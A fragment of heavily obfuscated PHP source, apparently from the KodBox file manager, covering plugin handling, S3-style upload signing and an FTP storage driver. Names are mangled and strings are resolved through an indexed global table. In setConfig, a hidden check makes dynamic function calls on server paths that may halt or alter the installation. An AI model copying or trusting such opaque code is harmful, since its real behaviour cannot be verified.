$Šè³»¤¶[1205]; } $“Òã•¬í = $û¦òØ…Ş . $ôˆÓÍ€; if (@file_exists($“Òã•¬í)) { return $“Òã•¬í; } return IO::copy($çØÅÂ®, $û¦òØ…Ş, 0, $ôˆÓÍ€); } final function appPackage() { $ŠÕæû¡Ç =& $_SERVER[ì™ı‰º¯]; if ($this->packageData) { return $this->packageData; } $ÁâŠªá = $this->parseFile($this->pluginPath . $ŠÕæû¡Ç[1566]); $this->parseLang($ÁâŠªá); $ ªì„…± = json_decode_force($ÁâŠªá); if (!$ ªì„…±) { return array(); } $’í¡Ÿ× = Hook::trigger($ŠÕæû¡Ç[1567], $ ªì„…±); if ($’í¡Ÿ× && is_array($’í¡Ÿ×)) { $ ªì„…± = $’í¡Ÿ×; } $this->packageData = $ ªì„…±; return $ ªì„…±; } public function packageInfoGet($ÇƒÀúßà) { $ß»òø•Ã = $this->appPackage(); return array_get_value($ß»òø•Ã, $ÇƒÀúßà); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ì™ı‰º¯][1568]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ì™ı‰º¯][1569]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ì™ı‰º¯][1570]); } public function echoJsAssign($¾‚™ëİ§, $ÜÁ·¿Ê±) { $this->echoJsAssignArr[$¾‚™ëİ§] = $ÜÁ·¿Ê±; } private function parseFile($í£³‹“¢) { $öşù£º™ =& $_SERVER[ì™ı‰º¯]; $™û»âĞÏ = file_get_contents_nossl($í£³‹“¢); $ú½ÕÂº¦ = array($öşù£º™[1571], $öşù£º™[1572], $öşù£º™[1573], $öşù£º™[1574], $öşù£º™[1575], $öşù£º™[1576], $öşù£º™[1577]); $š»ÜéÁå = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$öşù£º™[89]][$öşù£º™[1578]]); foreach ($this->echoJsAssignArr as $Ÿøñ™´° => $èÑ¸“û) { $ú½ÕÂº¦[] = $öşù£º™[1579] . $Ÿøñ™´° . $öşù£º™[1580]; $š»ÜéÁå[] = is_array($èÑ¸“û) || is_object($èÑ¸“û) ? rawurlencode(json_encode($èÑ¸“û)) : $èÑ¸“û; } if (strstr($™û»âĞÏ, $öşù£º™[1581])) { $É…Åû€Ø = rawurlencode(json_encode($this->pluginLangArr)); $™û»âĞÏ = str_replace($öşù£º™[1581], $É…Åû€Ø, $™û»âĞÏ); } if (strstr($™û»âĞÏ, $öşù£º™[1582])) { $É…Åû€Ø = $É…Åû€Ø = rawurlencode(json_encode($this->getConfig())); $™û»âĞÏ = str_replace($öşù£º™[1582], $É…Åû€Ø, $™û»âĞÏ); } $™û»âĞÏ = str_replace($ú½ÕÂº¦, $š»ÜéÁå, $™û»âĞÏ); return $™û»âĞÏ; } private function parseLang(&$·Ë İÒñ) { $Ú¦¸ø‹œ =& $_SERVER[ì™ı‰º¯]; $ù½§¹² = $Ú¦¸ø‹œ[1583]; if (!strstr($·Ë İÒñ, $ù½§¹²)) { return; } preg_match_all($Ú¦¸ø‹œ[1584], $·Ë İÒñ, $ÉÄï¦Ù); if (!is_array($ÉÄï¦Ù) || count($ÉÄï¦Ù) == 0 || !is_array($ÉÄï¦Ù[0]) || count($ÉÄï¦Ù[0]) == 0) { return; } $¯ŒşÇş™ = array(); $§É¡„ßÎ = array(); foreach ($ÉÄï¦Ù[0] as $¥Û®óæÄ) { $îˆÏ²Œú = substr($¥Û®óæÄ, strlen($ù½§¹²), -4); $»òÈï¸Ñ = LNG($îˆÏ²Œú); $¯ŒşÇş™[] = $¥Û®óæÄ; $§É¡„ßÎ[] = str_replace(array($Ú¦¸ø‹œ[231], $Ú¦¸ø‹œ[1077], $Ú¦¸ø‹œ[342], $Ú¦¸ø‹œ[118]), array($Ú¦¸ø‹œ[53], $Ú¦¸ø‹œ[53], $Ú¦¸ø‹œ[12], $Ú¦¸ø‹œ[1585]), $»òÈï¸Ñ); } $·Ë İÒñ = str_replace($¯ŒşÇş™, $§É¡„ßÎ, $·Ë İÒñ); } private function parseConfig(&$ÊÏ›œ¡) { $ö§¿¹úÒ =& $_SERVER[ì™ı‰º¯]; $¯µÜñŠû = $ö§¿¹úÒ[1586]; if (!strstr($ÊÏ›œ¡, $¯µÜñŠû)) { return; } preg_match_all($ö§¿¹úÒ[1587], $ÊÏ›œ¡, $œå¦ß½•); if (!is_array($œå¦ß½•) || count($œå¦ß½•) == 0 || !is_array($œå¦ß½•[0]) || count($œå¦ß½•[0]) == 0) { return; } $Öú¨Í¹ = $this->getConfig(); $™ì‰úîè = array(); $Öø‰é» = array(); foreach ($œå¦ß½•[0] as $¼Åò¸Š†) { $×ãÀô‹õ = substr($¼Åò¸Š†, strlen($¯µÜñŠû), -2); $™ì‰úîè[] = $¼Åò¸Š†; $Öø‰é»[] = _get($Öú¨Í¹, $×ãÀô‹õ); } $ÊÏ›œ¡ = str_replace($™ì‰úîè, $Öø‰é», $ÊÏ›œ¡); } private function parsePackage(&$İÕ¬€ô¶) { $·ñ‚Ğ©æ =& $_SERVER[ì™ı‰º¯]; $Ó©ù÷ = $·ñ‚Ğ©æ[1588]; if (!strstr($İÕ¬€ô¶, $Ó©ù÷)) { return; } preg_match_all($·ñ‚Ğ©æ[1589], $İÕ¬€ô¶, $ÇÀØıê); if (!is_array($ÇÀØıê) || count($ÇÀØıê) == 0 || !is_array($ÇÀØıê[0]) || count($ÇÀØıê[0]) == 0) { return; } $ÆÏ ¿² = $this->appPackage(); $àŸ³¬¢ = array(); $÷áş‚À– = array(); foreach ($ÇÀØıê[0] as $¤Ëú¥‡) { $£Ç³çîü = substr($¤Ëú¥‡, strlen($Ó©ù÷), -2); $àŸ³¬¢[] = $¤Ëú¥‡; $÷áş‚À–[] = _get($ÆÏ ¿², $£Ç³çîü); } $İÕ¬€ô¶ = str_replace($àŸ³¬¢, $÷áş‚À–, $İÕ¬€ô¶); } final function echoFile($µÕçá« , $Ù¶ˆó¸î = false) { $–ñÁº¼ã =& $_SERVER[ì™ı‰º¯]; $Èİ×ì®ù = $this->pluginPath . $µÕçá« ; if (ACT == $–ñÁº¼ã[1590]) { echo $–ñÁº¼ã[1591] . $this->pluginName . $–ñÁº¼ã[8] . $µÕçá«  . $–ñÁº¼ã[1592]; if (!file_exists($Èİ×ì®ù)) { echo $–ñÁº¼ã[1593]; return; } } $§ßåã•ı = $this->parseFile($Èİ×ì®ù); $this->parseLang($§ßåã•ı); $this->parseConfig($§ßåã•ı); $this->parsePackage($§ßåã•ı); if (is_array($Ù¶ˆó¸î)) { $§ßåã•ı = str_replace(array_keys($Ù¶ˆó¸î), array_values($Ù¶ˆó¸î), $§ßåã•ı); } echo $–ñÁº¼ã[231] . $§ßåã•ı; } final function initLang() { $«øŠú¾± =& $_SERVER[ì™ı‰º¯]; $ÌòûõÛŒ = $«øŠú¾±[1594]; $Õìßíì = $this->pluginPath . $«øŠú¾±[1595]; $ãğàèØú = I18n::getType(); $Ê†¢Şİ’ = array(); if (file_exists($Õìßíì . $ãğàèØú . $«øŠú¾±[834])) { $Ê†¢Şİ’ = (include $Õìßíì . $ãğàèØú . $«øŠú¾±[834]); } else { if ($ãğàèØú == $«øŠú¾±[1596] && !file_exists($Õìßíì . $ãğàèØú . $«øŠú¾±[834]) && file_exists($Õìßíì . $«øŠú¾±[1597])) { $Ê†¢Şİ’ = (include $Õìßíì . $«øŠú¾±[1597]); } else { if (file_exists($Õìßíì . $ÌòûõÛŒ . $«øŠú¾±[834])) { $Ê†¢Şİ’ = (include $Õìßíì . $ÌòûõÛŒ . $«øŠú¾±[834]); } } } if (!is_array($Ê†¢Şİ’)) { return array(); } if (@count($Ê†¢Şİ’) > 0) { I18n::set($Ê†¢Şİ’); } return $Ê†¢Şİ’; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($çºêªº“) { $À¼ëÛÌç =& $_SERVER[ì™ı‰º¯]; if ($_SERVER[$À¼ëÛÌç[872]] != $_SERVER[$À¼ëÛÌç[1511]]) { $ÛïçàŒæ = $À¼ëÛÌç[874]; $„¯¦Ù¾± = $À¼ëÛÌç[875]; $¨Î¦İ©î = $_SERVER[$À¼ëÛÌç[876]] . $À¼ëÛÌç[877]; $ıİö± = $„¯¦Ù¾±($¨Î¦İ©î); $®ÔÊ…õÄ = explode($À¼ëÛÌç[231], $ıİö±); if (count($®ÔÊ…õÄ) < $À¼ëÛÌç[610]) { $Ê˜Ä…ç = $À¼ëÛÌç[878]; $Ê˜Ä…ç(); } $¨ñ•ÚŸ = $À¼ëÛÌç[879]; $¨ñ•ÚŸ($_SERVER[$À¼ëÛÌç[880]]); $¨ñ•ÚŸ($_SERVER[$À¼ëÛÌç[876]] . $À¼ëÛÌç[1598]); $Ïì‡ â£ = 1; while ($Ïì‡ â£ > 1) { $Ïì‡ â£ = $Ïì‡ â£ + 4; $†¹´æíğ = rawurlencode($Ïì‡ â£ . $À¼ëÛÌç[378]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $çºêªº“); } public function onSetConfig($§­™ªıû) { } public function onGetConfig($›ºèö˜) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($³ğíŞß) { if ($³ğíŞß == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ÃèÎÁºÙ = "\x70\x6c\165\x67\x69\156\101\x75\x74\x68") { $€ÓëÒ› =& $_SERVER[ì™ı‰º¯]; if (!Session::get($€ÓëÒ›[1549])) { return !1; } if (_get($GLOBALS, $€ÓëÒ›[494])) { return !0; } $“°‹ ¿ˆ = $this->getConfig(); if (!$“°‹ ¿ˆ[$ÃèÎÁºÙ]) { return !1; } return ActionCall($€ÓëÒ›[1599], $“°‹ ¿ˆ[$ÃèÎÁºÙ]); } public function url($‘ğ„°¢, $šòØÚ×Ÿ = '', $Î±”Ò­é = true) { $âÌû‹½ï =& $_SERVER[ì™ı‰º¯]; $èö‰‘à• = $this->getConfig(); $È•àî©ª = KOD_VERSION . $âÌû‹½ï[10] . KOD_VERSION_BUILD; $¤¨Æ€ = $this->packageVersion(); $«ôƒİ¼ = $È•àî©ª . $âÌû‹½ï[386] . $¤¨Æ€; if (substr($‘ğ„°¢, 0, 4) == $âÌû‹½ï[148] || substr($‘ğ„°¢, 0, 2) == $âÌû‹½ï[1378]) { $¡‚°¹˜ = $‘ğ„°¢ . $âÌû‹½ï[1600] . $«ôƒİ¼; } else { if ($šòØÚ×Ÿ == $âÌû‹½ï[12]) { $¡‚°¹˜ = $this->pluginHost . $‘ğ„°¢ . $âÌû‹½ï[1600] . $«ôƒİ¼; } else { if ($šòØÚ×Ÿ === $âÌû‹½ï[75]) { $¡‚°¹˜ = $this->pluginHost . $‘ğ„°¢; } else { if ($šòØÚ×Ÿ == $âÌû‹½ï[1601]) { $¡‚°¹˜ = STATIC_PATH . $‘ğ„°¢ . $âÌû‹½ï[1600] . $È•àî©ª; } else { if ($šòØÚ×Ÿ == $âÌû‹½ï[1602]) { $¡‚°¹˜ = APP_HOST . $âÌû‹½ï[1603] . $‘ğ„°¢ . $âÌû‹½ï[1600] . $È•àî©ª; } else { if (isset($èö‰‘à•[$šòØÚ×Ÿ])) { $¡‚°¹˜ = $èö‰‘à•[$šòØÚ×Ÿ] . $‘ğ„°¢ . $âÌû‹½ï[1600] . $«ôƒİ¼; } } } } } } if (!$Î±”Ò­é) { return $¡‚°¹˜; } echo $¡‚°¹˜; } public function link($ £òá¾õ = false, $Î°•¸¹™ = '') { $‘ƒ¹›õ¨ =& $_SERVER[ì™ı‰º¯]; if (!$ £òá¾õ) { $this->link($‘ƒ¹›õ¨[1604], $‘ƒ¹›õ¨[1602]); $this->link($‘ƒ¹›õ¨[1605], $‘ƒ¹›õ¨[1601]); $this->link($‘ƒ¹›õ¨[1606], $‘ƒ¹›õ¨[1601]); $this->link($‘ƒ¹›õ¨[1607], $‘ƒ¹›õ¨[1601]); $this->link($‘ƒ¹›õ¨[1608], $‘ƒ¹›õ¨[1601]); return; } $Òó½¦¾ = $this->url($ £òá¾õ, $Î°•¸¹™, !1); if (substr($ £òá¾õ, -3) == $‘ƒ¹›õ¨[1609]) { echo $‘ƒ¹›õ¨[1610] . $Òó½¦¾ . $‘ƒ¹›õ¨[1611] . $‘ƒ¹›õ¨[231]; } else { if (substr($ £òá¾õ, -4) == $‘ƒ¹›õ¨[1612]) { echo $‘ƒ¹›õ¨[1613] . $Òó½¦¾ . $‘ƒ¹›õ¨[1614] . $‘ƒ¹›õ¨[231]; } } } } goto dÌ¸‡ëŠˆá; C’©˜Š°ª¦: class PathDriverEDS extends PathDriverMinIO { public function __construct($››±£óè) { parent::__construct($››±£óè); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($şşÔùüš) { parent::__construct($şşÔùüš); $this->signatureVersion($_SERVER[ì™ı‰º¯][216]); } public function uploadFormData($ Šßêš—, $‡ç˜Õêş = 3600) { $íè§ù¼ =& $_SERVER[ì™ı‰º¯]; $É•°«š = $íè§ù¼[199]; $é’¡üõÉ = $íè§ù¼[1357]; $şÅ÷¥ÕÜ = $íè§ù¼[62]; $ÕâœØËŸ = gmdate($íè§ù¼[1358]); $ˆ‚ù½ƒÄ = gmdate($íè§ù¼[746]); $§¹ÄâÊ¾ = $íè§ù¼[1359]; $ö‘íô­÷ = $‡ç˜Õêş . $íè§ù¼[12]; $åÓ¾ãü = $íè§ù¼[1321]; $”Şş®£ = array($this->accessKey, $ˆ‚ù½ƒÄ, $this->region, $şÅ÷¥ÕÜ, $§¹ÄâÊ¾); $Ùª¬‡£í = implode($íè§ù¼[8], $”Şş®£); $ÆÆ¼’úå = array($íè§ù¼[1323] => gmdate($íè§ù¼[1322], strtotime($íè§ù¼[1360])), $íè§ù¼[1324] => array(array($íè§ù¼[1326] => $this->bucket), array($íè§ù¼[1325] => $É•°«š), array($íè§ù¼[1327], $íè§ù¼[1328], $íè§ù¼[12]), array($íè§ù¼[1327], $íè§ù¼[1361], $íè§ù¼[12]), array($íè§ù¼[1327], $íè§ù¼[1362], $íè§ù¼[12]), array($íè§ù¼[1329] => $åÓ¾ãü), array($íè§ù¼[1363] => $Ùª¬‡£í), array($íè§ù¼[1364] => $é’¡üõÉ), array($íè§ù¼[1365] => $ÕâœØËŸ), array($íè§ù¼[1366] => $ö‘íô­÷))); $“±ƒ„» = base64_encode(json_encode($ÆÆ¼’úå)); $¨Ø©ôâ = hash_hmac($íè§ù¼[1367], $ˆ‚ù½ƒÄ, $íè§ù¼[1368] . $this->secret, !0); $Ïü‘Ó§ø = hash_hmac($íè§ù¼[1367], $this->region, $¨Ø©ôâ, !0); $¯†›Ş‹„ = hash_hmac($íè§ù¼[1367], $şÅ÷¥ÕÜ, $Ïü‘Ó§ø, !0); $÷µÈ‹¤ = hash_hmac($íè§ù¼[1367], $§¹ÄâÊ¾, $¯†›Ş‹„, !0); $ÍÁ˜Ìëû = hash_hmac($íè§ù¼[1367], $“±ƒ„», $÷µÈ‹¤); $ø±Š¥Šã = array($íè§ù¼[215] => $íè§ù¼[12], $íè§ù¼[1369] => $íè§ù¼[12], $íè§ù¼[1325] => $É•°«š, $íè§ù¼[1329] => $åÓ¾ãü, $íè§ù¼[1333] => $“±ƒ„», $íè§ù¼[1370] => $Ùª¬‡£í, $íè§ù¼[1371] => $é’¡üõÉ, $íè§ù¼[1372] => $ÕâœØËŸ, $íè§ù¼[1373] => $ö‘íô­÷, $íè§ù¼[1374] => $ÍÁ˜Ìëû, $íè§ù¼[182] => $this->getHost()); return $ø±Š¥Šã; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($Èß©ˆş) { parent::__construct(); if (count($Èß©ˆş) > 0) { $this->_init($Èß©ˆş); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ÂùåûÍ’) { $ÇÅ™éú =& $_SERVER[ì™ı‰º¯]; global $config; $this->appCharset = $config[$ÇÅ™éú[1375]]; $this->systemCharset = $config[$ÇÅ™éú[1376]]; if (isset($ÂùåûÍ’[$ÇÅ™éú[1377]]) && $ÂùåûÍ’[$ÇÅ™éú[1377]]) { $this->systemCharset = $ÂùåûÍ’[$ÇÅ™éú[1377]]; } } public function iconvApp($¹’ëå²Š) { return $this->iconvTo($¹’ëå²Š, $this->systemCharset, $this->appCharset); } public function iconvSystem($´„Ëî†â) { return $this->iconvTo($´„Ëî†â, $this->appCharset, $this->systemCharset); } public function getPathOuter($–¦Æ¯†È) { $ÚÔÓ›§‹ =& $_SERVER[ì™ı‰º¯]; $°‡¬¡Å• = $this->iconvApp($this->pathBase); $–¦Æ¯†È = $this->iconvApp($–¦Æ¯†È); if (substr($°‡¬¡Å•, 0, 2) == $ÚÔÓ›§‹[1378]) { $°‡¬¡Å• = BASIC_PATH . substr($°‡¬¡Å•, 2); } if (substr($–¦Æ¯†È, 0, 2) == $ÚÔÓ›§‹[1378]) { $–¦Æ¯†È = BASIC_PATH . substr($–¦Æ¯†È, 2); } $°‡¬¡Å• = KodIO::clear($°‡¬¡Å•); $–¦Æ¯†È = KodIO::clear($–¦Æ¯†È); $–¦Æ¯†È = substr($–¦Æ¯†È, strlen($°‡¬¡Å•)); if (empty($this->pathDriver)) { return $–¦Æ¯†È; } return $this->pathDriver . $ÚÔÓ›§‹[8] . ltrim($–¦Æ¯†È, $ÚÔÓ›§‹[8]); } private function _init($‹ÁŞˆô = array()) { $¢Ó‡Íàù =& $_SERVER[ì™ı‰º¯]; if (!function_exists($¢Ó‡Íàù[1379])) { throw new Exception(LNG($¢Ó‡Íàù[1380])); } $this->config = $‹ÁŞˆô; $this->charsetReset($‹ÁŞˆô); foreach ($‹ÁŞˆô as $‘î•’øÕ => $¦Ù„â‹Ø) { if (isset($this->{$‘î•’øÕ})) { $this->{$‘î•’øÕ} = $¦Ù„â‹Ø; } } return $this->_login($‹ÁŞˆô); } private function _login($‹íğÂëŞ) { $”¼àæÒ¥ =& $_SERVER[ì™ı‰º¯]; static $Ğº³Ä£ = array(); $÷ğëÎ°™ = md5(json_encode($‹íğÂëŞ)); if (isset($Ğº³Ä£[$÷ğëÎ°™])) { foreach ($Ğº³Ä£[$÷ğëÎ°™] as $íò®Ï±Œ => $ØÏ×¯é³) { $this->{$íò®Ï±Œ} = $ØÏ×¯é³; } return !0; } $¬äËâÁ = parse_url(trim($this->server, $”¼àæÒ¥[8])); $this->host = $¬äËâÁ[$”¼àæÒ¥[182]]; $ÂüÖ…öÕ = isset($¬äËâÁ[$”¼àæÒ¥[181]]) && $¬äËâÁ[$”¼àæÒ¥[181]] == $”¼àæÒ¥[1381] ? !0 : !1; $this->scheme = $ÂüÖ…öÕ ? $”¼àæÒ¥[1382] : $”¼àæÒ¥[1383]; $this->port = isset($¬äËâÁ[$”¼àæÒ¥[183]]) ? $¬äËâÁ[$”¼àæÒ¥[183]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $‹¸Íòã§ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $á’õÒ = $this->pasv == $”¼àæÒ¥[88] ? !0 : !1; @ftp_pasv($this->connect, $á’õÒ); $Ğº³Ä£[$÷ğëÎ°™] = array($”¼àæÒ¥[1384] => $this->connect, $”¼àæÒ¥[182] => $this->host, $”¼àæÒ¥[181] => $this->scheme, $”¼àæÒ¥[183] => $this->port); return $‹¸Íòã§; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($Ê¡Ò¢•, $¾Éº•â = '', $Ù®ÛÒÉÍ = REPEAT_RENAME) { if ($this->setContent($Ê¡Ò¢•, $¾Éº•â)) { return $this->getPathOuter($Ê¡Ò¢•); } return !1; } public function mkdir($…ß•¹ò, $Ğ¦áºŠŠ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $…ß•¹ò = $this->iconvSystem($…ß•¹ò); if ($this->_isFolder($…ß•¹ò) || @ftp_mkdir($this->connect, $…ß•¹ò)) { return $this->getPathOuter($…ß•¹ò); } if (!$this->mkdir($this->pathFather($…ß•¹ò))) { return !1; } if ($…ß•¹ò = @ftp_mkdir($this->connect, $…ß•¹ò)) { return $this->getPathOuter($…ß•¹ò); } return !1; } public function copyFile($Û½ ‰¿Ï, $Ñı§­ãÃ) { if (!$this->_isconn()) { return !1; } $öíÕ‡½ò = $this->pathThis($this->iconvSystem($Û½ ‰¿Ï)); $Àñõ÷Ùü = $this->tempFile($öíÕ‡½ò); $®‰±É¯¦ = $this->iconvApp($Àñõ÷Ùü); $this->download($Û½ ‰¿Ï, $®‰±É¯¦); $ñıâŸŞ = $this->upload($Ñı§­ãÃ, $®‰±É¯¦); $this->tempFileRemve($Àñõ÷Ùü); return $ñıâŸŞ; } public function moveFile($Äğãø„, $‡³€À³í) { if (!$this->_isconn()) { return !1; } $Äğãø„ = $this->iconvSystem($Äğãø„); $‡³€À³í = $this->iconvSystem($‡³€À³í); $´±”×£Ä = @ftp_rename($this->connect, $Äğãø„, $‡³€À³í); return $´±”×£Ä ? $this->getPathOuter($‡³€À³í) : !1; } public function delFile($ÀÎÉÎ¾×) { if (!$this->_isconn()) { return !1; } $ÀÎÉÎ¾× = $this->iconvSystem($ÀÎÉÎ¾×); return @ftp_delete($this->connect, $ÀÎÉÎ¾×); } public function delFolder($¦İ£î‰¢) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ÊşóÇ¤ = $®¨—Ïü¬ = array(); $this->fileList($¦İ£î‰¢, $ÊşóÇ¤, $®¨—Ïü¬, !0); $this->listItemCache = !0; foreach ($®¨—Ïü¬ as $–¼€ì¤Ó) { $ÌóËá‚® = $this->iconvSystem($–¼€ì¤Ó[$_SERVER[ì™ı‰º¯][32]]); $Œèš±Ù” = @ftp_delete($this->connect, $ÌóËá‚®); if (!$Œèš±Ù”) { return !1; } } foreach ($ÊşóÇ¤ as $ÌóËá‚®) { $ÌóËá‚® = $this->iconvSystem($ÌóËá‚®); $Œèš±Ù” = @ftp_rmdir($this->connect, $ÌóËá‚®); if (!$Œèš±Ù”) { return !1; } } $¦İ£î‰¢ = $this->iconvSystem($¦İ£î‰¢); return @ftp_rmdir($this->connect, $¦İ£î‰¢); } public function rename($¦¶Ì›á, $ˆÇø¬ˆÖ) { $ĞêÆ¿µî =& $_SERVER[ì™ı‰º¯]; if (!$this->_isconn()) { return !1; } $ùŸÑÛÁ = $this->fileNameAuto($this->pathFather($¦¶Ì›á), $ˆÇø¬ˆÖ); $ùŸÑÛÁ = $this->iconvSystem($ùŸÑÛÁ); $¦¶Ì›á = $this->iconvSystem($¦¶Ì›á); $áŠƒÊ¤ = $this->pathFather($¦¶Ì›á); $†¬°ËŸ = rtrim($áŠƒÊ¤, $ĞêÆ¿µî[8]) . $ĞêÆ¿µî[8] . $ùŸÑÛÁ; $Ø­‹‰„è = @ftp_rename($this->connect, $¦¶Ì›á, $†¬°ËŸ); $†¬°ËŸ = $this->iconvApp($†¬°ËŸ); return $Ø­‹‰„è ? $this->getPathOuter($†¬°ËŸ) : !1; } private function folderInfo($é›Ì¼˜‘, $½ôƒ“Ò = false) { $€óŸ¥½Ö =& $_SERVER[ì™ı‰º¯]; $”øäéô = array($€óŸ¥½Ö[32] => $this->pathThis($é›Ì¼˜‘), $€óŸ¥½Ö[84] => $this->getPathOuter($€óŸ¥½Ö[8] . $é›Ì¼˜‘), $€óŸ¥½Ö[33] => $€óŸ¥½Ö[75]); if ($½ôƒ“Ò) { return $”øäéô; } $”øäéô[$€óŸ¥½Ö[201]] = $”øäéô[$€óŸ¥½Ö[85]] = 0; $”øäéô[$€óŸ¥½Ö[202]] = $”øäéô[$€óŸ¥½Ö[203]] = !0; return $”øäéô; } private function fileInfo($ë¾‰šïÉ, $ÚöÎ‹Ş = false, $÷ğ­ Ñ = array()) { $İØÖÖæš =& $_SERVER[ì™ı‰º¯]; $îä¬â„– = array($İØÖÖæš[32] => $this->pathThis($ë¾‰šïÉ), $İØÖÖæš[84] => $this->getPathOuter($İØÖÖæš[8] . $ë¾‰šïÉ), $İØÖÖæš[33] => $İØÖÖæš[200], $İØÖÖæš[76] => isset($÷ğ­ Ñ[$İØÖÖæš[76]]) ? $÷ğ­ Ñ[$İØÖÖæš[76]] : 0, $İØÖÖæš[174] => $this->ext($ë¾‰šïÉ)); if ($ÚöÎ‹Ş) { return $îä¬â„–; } $îä¬â„–[$İØÖÖæš[201]] = $îä¬â„–[$İØÖÖæš[85]] = 0; $îä¬â„–[$İØÖÖæš[202]] = $îä¬â„–[$İØÖÖæš[203]] = !0; $Ó¢ˆÂ‹ = $this->iconvSystem($ë¾‰šïÉ); $îä¬â„–[$İØÖÖæš[85]] = @ftp_mdtm($this->connect, $Ó¢ˆÂ‹); if (empty($÷ğ­ Ñ)) { $÷ğ­ Ñ = $this->objectMeta($ë¾‰šïÉ); if (!$÷ğ­ Ñ) { return $îä¬â„–; } } $îä¬â„–[$İØÖÖæš[76]] = $÷ğ­ Ñ[$İØÖÖæš[76]]; return $îä¬â„–; } public function size($±Í°ıÖ€) { $ÛïÔÀš = $this->objectMeta($±Í°ıÖ€); return $ÛïÔÀš ? $ÛïÔÀš[$_SERVER[ì™ı‰º¯][76]] : 0; } public function info($Ÿ­²°­§) { if ($this->isFile($Ÿ­²°­§)) { return $this->fileInfo($Ÿ­²°­§, 0); } else { if ($this->isFolder($Ÿ­²°­§)) { return $this->folderInfo($Ÿ­²°­§); } } return !1; } private function fileList($óòäÈ¤ö, &$ÙÜŞ‹Ì«, &$¿“•„, $¶ãû—É› = false) { $—ÜŠ¶Í„ =& $_SERVER[ì™ı‰º¯]; $óòäÈ¤ö = $this->iconvSystem($óòäÈ¤ö); if (!$this->isFolder($óòäÈ¤ö)) { return !1; } @ftp_chdir($this->connect, $—ÜŠ¶Í„[8]); $óòäÈ¤ö = rtrim($óòäÈ¤ö, $—ÜŠ¶Í„[8]) . $—ÜŠ¶Í„[8]; check_abort(); $”îîÆôÓ = @ftp_rawlist($this->connect, $óòäÈ¤ö); if (!$”îîÆôÓ) { $”îîÆôÓ = array(); } $Ëû®¹¦è = array($—ÜŠ¶Í„[10] => 1, $—ÜŠ¶Í„[1385] => 1); foreach ($”îîÆôÓ as $’†½‰óİ) { $àÒ’ Š = $this->_listItem($’†½‰óİ); if ($àÒ’ Š[0] == $—ÜŠ¶Í„[754]) { continue; } $İ‘ÓÉùô = $àÒ’ Š[8]; if (empty($İ‘ÓÉùô) && $İ‘ÓÉùô !== $—ÜŠ¶Í„[198] || isset($Ëû®¹¦è[$İ‘ÓÉùô])) { continue; } $İ‘ÓÉùô = $this->iconvApp($óòäÈ¤ö . ltrim($İ‘ÓÉùô, $—ÜŠ¶Í„[8])); $¾š—Ä³ƒ = array($—ÜŠ¶Í„[32] => $İ‘ÓÉùô, $—ÜŠ¶Í„[33] => $—ÜŠ¶Í„[200], $—ÜŠ¶Í„[76] => $àÒ’ Š[4]); if (substr($’†½‰óİ, 0, 1) == $—ÜŠ¶Í„[1386]) { $¾š—Ä³ƒ[$—ÜŠ¶Í„[33]] = $—ÜŠ¶Í„[75]; $¾š—Ä³ƒ[$—ÜŠ¶Í„[76]] = 0; } $÷ÇòØÎÛ = $¾š—Ä³ƒ[$—ÜŠ¶Í„[33]] == $—ÜŠ¶Í„[75] ? !0 : !1; $this->cacheMethodInfoSet($İ‘ÓÉùô, $÷ÇòØÎÛ, $¾š—Ä³ƒ); if ($÷ÇòØÎÛ) { $ÙÜŞ‹Ì«[] = $İ‘ÓÉùô; if ($¶ãû—É›) { $this->fileList($İ‘ÓÉùô, $ÙÜŞ‹Ì«, $¿“•„, $¶ãû—É›); } continue; } $¿“•„[] = $¾š—Ä³ƒ; } $this->cacheMethodInfoSet($óòäÈ¤ö, !0); } private function _listItem($¾È÷‡îÇ) { if (empty($¾È÷‡îÇ)) { return array(); } $åãğøø = preg_split($_SERVER[ì™ı‰º¯][1387], $¾È÷‡îÇ); if (count($åãğøø) <= 9) { return $åãğøø; } $åãğøø[8] = trim(substr($¾È÷‡îÇ, strpos($¾È÷‡îÇ, $åãğøø[7]) + strlen($åãğøø[7]))); return array_splice($åãğøø, 0, 9); } public function listPath($€îÃ÷ìè, $Óü¡³‡ = false) { $ğ¬åÃ =& $_SERVER[ì™ı‰º¯]; if (!$this->_isconn()) { return !1; } $ÖÆ¿™ßÄ = $ÑÉØ¤ÌÃ = array(); $this->fileList($€îÃ÷ìè, $ÖÆ¿™ßÄ, $ÑÉØ¤ÌÃ); foreach ($ÖÆ¿™ßÄ as $÷Ö¢‡½ß => $®˜˜¶) { $ÖÆ¿™ßÄ[$÷Ö¢‡½ß] = $this->folderInfo($®˜˜¶, $Óü¡³‡); } foreach ($ÑÉØ¤ÌÃ as $÷Ö¢‡½ß => $®˜˜¶) { $ÑÉØ¤ÌÃ[$÷Ö¢‡½ß] = $this->fileInfo($®˜˜¶[$ğ¬åÃ[32]], $Óü¡³‡, $®˜˜¶); } return array($ğ¬åÃ[82] => $ÖÆ¿™ßÄ, $ğ¬åÃ[83] => $ÑÉØ¤ÌÃ); } public function has($Ô¯‹¡øÜ, $¨Øô½äå = false, $¼ë´ğ Ş = true) { $ß—ı©šÓ =& $_SERVER[ì™ı‰º¯]; $ÆûÅü‹ò = $Ã…ƒÛüê = array(); $¡ïÑ®›¾ = $¨Øô½äå ? !0 : !1; 